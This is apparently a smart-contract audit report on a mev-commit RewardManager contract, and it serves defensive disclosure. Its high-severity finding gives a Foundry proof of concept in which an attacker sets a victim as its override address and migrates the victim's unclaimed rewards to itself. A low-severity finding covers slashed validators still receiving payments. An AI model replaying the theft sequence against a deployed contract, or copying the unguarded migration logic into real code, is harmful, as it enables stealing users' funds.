
| ID   | Title                                                                                                |
| ---- | ---------------------------------------------------------------------------------------------------- |
| H-01 | unclaimed rewards of anyone are claimable by any receiver<br>                                        |
| L-01 | `_findReceiver` doesn't check validator opted-in or not, but it checks if the validtor exist or not. |


# [H-01] unclaimed rewards of anyone are claimable by any receiver

## Description

There is no restriction for putting any address as overridden address, so Malicious receiver can set override address has no relation with but have unclaimed rewards, then call `removeOverrideAddress` and while removing it enable `migrateExistingRewards` this transfers existing rewards from the overridden address atomically to the receiver.

```javascript

    function overrideReceiver(address overrideAddress, bool migrateExistingRewards) external whenNotPaused nonReentrant {
        if (migrateExistingRewards) { _migrateRewards(msg.sender, overrideAddress); }
        require(overrideAddress != address(0) && overrideAddress != msg.sender, InvalidAddress());
        overrideAddresses[msg.sender] = overrideAddress;
        emit OverrideAddressSet(msg.sender, overrideAddress);
    }

    function removeOverrideAddress(bool migrateExistingRewards) external whenNotPaused nonReentrant {
        address toBeRemoved = overrideAddresses[msg.sender];
        require(toBeRemoved != address(0), NoOverriddenAddressToRemove());
        if (migrateExistingRewards) { _migrateRewards(toBeRemoved, msg.sender); }
        overrideAddresses[msg.sender] = address(0);
        emit OverrideAddressRemoved(msg.sender);
    }
```

```javascript
    function _migrateRewards(address from, address to) internal {
        uint256 amount = unclaimedRewards[from];
        if (amount == 0) {
            emit NoRewards(from);
            return;
        }
        unclaimedRewards[from] = 0;
        unclaimedRewards[to] += amount;
        emit RewardsMigrated(from, to, amount);
    }
```

### impact
stealing unclaimed rewards from users 

## Proof of Concept
- add this to `RewardManagerTest.sol` and run 
```command
forge clean && forge test --via-ir --mt test_poc
```

```javascript
 function test_poc() public {
        // stake to register attacker
        vanillaRegistryTest.testSelfStake();
        address vanillaattacker = vanillaRegistryTest.user1();
        bytes memory vanillaAttackerPubkey = vanillaRegistryTest.user1BLSKey();

        vm.deal(user2, 4 ether);
        vm.expectEmit();
        emit PaymentStored(user2, vanillaattacker, vanillaattacker, 4 ether);
        vm.prank(user2);
        rewardManager.payProposer{value: 4 ether}(vanillaAttackerPubkey);

        assertEq(rewardManager.unclaimedRewards(vanillaattacker), 4 ether);


        // stake and payproposer to have unclaime rewards (victim)
        vanillaRegistryTest.testSelfStake2();
        address vanillavictim = vanillaRegistryTest.user2();
        bytes memory vanillaTestVictimPubkey = vanillaRegistryTest.user2BLSKey();

        vm.deal(user3, 4 ether);
        vm.expectEmit();
        emit PaymentStored(user3, vanillavictim, vanillavictim, 4 ether);
        vm.prank(user3);
        rewardManager.payProposer{value: 4 ether}(vanillaTestVictimPubkey);

        assertEq(rewardManager.unclaimedRewards(vanillavictim), 4 ether);
        

        vm.expectEmit();
        emit OverrideAddressSet(vanillaattacker, vanillavictim);
        vm.prank(vanillaattacker);
        rewardManager.overrideReceiver(vanillavictim, false);

        assertEq(rewardManager.unclaimedRewards(vanillaattacker), 4 ether);
        assertEq(rewardManager.unclaimedRewards(vanillavictim), 4 ether);

        vm.expectEmit();
        emit OverrideAddressRemoved(vanillaattacker);
        vm.prank(vanillaattacker);
        rewardManager.removeOverrideAddress(true);

        assertEq(rewardManager.unclaimedRewards(vanillavictim), 0 ether);
        assertEq(rewardManager.unclaimedRewards(vanillaattacker), 8 ether);
        }
```


## Recommendation
don't allow migrate rewards while removing override-addresses or don't allow setting override address which have unclaimed rewards before they claim them.

# [L-01] `_findReceiver` doesn't check validator opted-in or not, but it checks if the validtor exist or not.



## Description
validators can register through three different ways, however they aren't opted-in if the validator has unstaked their stake/deregerstired or gets slashed. Since `_findReceiver` doesn't check if it opted-in or not, but it checks if the validator exist or not, And while unstaking or slashing doesn't flag validator as non-exist anymore, `_findReceiver` will return the relevant address instead of zero address, so any rewards sent to them won't get orphaned and will be directly send to them.

```javascript
 /// @dev Finds the receiver address for a given validator pubkey,
    /// corresponding to state that'd exist in each type of registry if the pubkey were opted-in through that registry.
    /// @notice Zero address is returned if the pubkey is not opted-in to mev-commit.
    function _findReceiver(bytes calldata pubkey) internal view returns (address) {
        (,address operatorAddr,bool existsMiddleware,) = _mevCommitMiddleware.validatorRecords(pubkey);
        if (existsMiddleware && operatorAddr != address(0)) {
            return operatorAddr;
        }
        (bool existsVanilla,address vanillaWithdrawalAddr,,) = _vanillaRegistry.stakedValidators(pubkey);
        if (existsVanilla && vanillaWithdrawalAddr != address(0)) {
            return vanillaWithdrawalAddr;
        }
        (bool existsAvs,address podOwner,,) = _mevCommitAVS.validatorRegistrations(pubkey);
        if (existsAvs && podOwner != address(0)) {
            return podOwner;
        }
        return address(0);
    }
```

## Proof of Concept
- add this to `RewardManagerTest.sol` and run 
```command
forge clean && forge test --via-ir --mt test_POC1 
```

```javascript

    function test_POC() public {
        
        // stake and slash a validtor so it is not opted-in any more  
        vanillaRegistryTest.testSlashingStakedValidator();

        address vanillaTestUser = vanillaRegistryTest.user1();
        bytes memory vanillaTestUserPubkey = vanillaRegistryTest.user1BLSKey();

        // pay the opted-out validator
        vm.deal(user2, 4 ether);
        vm.expectEmit();
        emit PaymentStored(user2, vanillaTestUser, vanillaTestUser, 4 ether);
        vm.prank(user2);
        rewardManager.payProposer{value: 4 ether}(vanillaTestUserPubkey);

        // check if validator gets the rewards
        uint256 balanceBefore = vanillaTestUser.balance;
        vm.prank(vanillaTestUser);
        vm.expectEmit();
        emit RewardsClaimed(vanillaTestUser, 4 ether);
        rewardManager.claimRewards();
        assertEq(vanillaTestUser.balance, balanceBefore + 4 ether);
    }
```
## impact

> It is assumed builders will only call payProposer for validator pubkeys that are opted-in to mev-commit. Rewards should only be “orphaned” if a builder goes against the protocol and attempts to call payProposer on a pubkey that’s not opted-in to mev-commit. 

rewards won't get orphaned for validators who have been opted-in and no longer they are. they still gets rewards while they aren't in the system anymore.

## Recommendation
check if the validtor is opted-in or not in `_findReceiver` by invoking `_isValidatorOptedIn` From `ValidatorOptInRouter.sol` before sending rewards.



